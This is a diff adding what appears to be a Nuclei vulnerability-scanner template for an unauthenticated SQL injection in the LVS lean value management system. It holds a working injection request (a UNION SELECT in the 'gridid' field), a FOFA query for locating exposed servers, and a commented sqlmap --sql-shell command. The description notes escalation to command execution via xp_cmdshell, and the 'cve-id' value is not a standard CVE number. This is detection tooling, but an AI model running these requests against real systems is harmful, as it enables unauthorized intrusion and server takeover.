@@ -1,0 +1,49 @@
+id: 2024-105222224
+
+info:
+  name: LVS精益价值管理系统 LVS.Web.ashx SQL注入漏洞
+  author: k3ppf0r
+  severity: high
+  description: |  
+    LVS精益价值管理系统 /ajax/LVS.Web.AgencytaskList,LVS.Web.ashx 接口处存在SQL注入漏洞，未经身份验证的远程攻击者通过利用SQL注入漏洞配合数据库xp_cmdshell可以执行任意命令，从而控制服务器。经过分析与研判，该漏洞利用难度低，建议尽快修复。
+  reference:
+    - https://blog.csdn.net/qq_41904294/article/details/139126590?spm=1001.2014.3001.5502
+  remediation: |
+    打对应补丁，重启服务
+  classification:
+    cve-id: 2024-105222224
+    cvss-score: 7.8
+    cwe-id: CWE-89
+  metadata:
+    date:  2024-05-22 
+    version: LVS精益价值管理系统
+    fofa-query: body="/ajax/LVS.Core.Common.STSResult,LVS.Core.Common.ashx"
+  tags: sqli,LVS精益价值管理系统
+
+# python sqlmap.py -u "http://xxxx?id=1*" --sql-shell 
+
+
+http:
+  - raw:
+      - |
+        @timeout: 10s
+        POST /ajax/LVS.Web.AgencytaskList,LVS.Web.ashx?_method=GetColumnIndex&_session=r HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Content-Type: text/plain; charset=UTF-8
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: keep-alive
+        
+        src=AgencytaskList
+        gridid=1' UNION ALL SELECT @@VERSION--
+ 
+
+    stop-at-first-match: true
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(body, "SQL Server")'
+          - 'status_code == 200'
+        condition: and
+
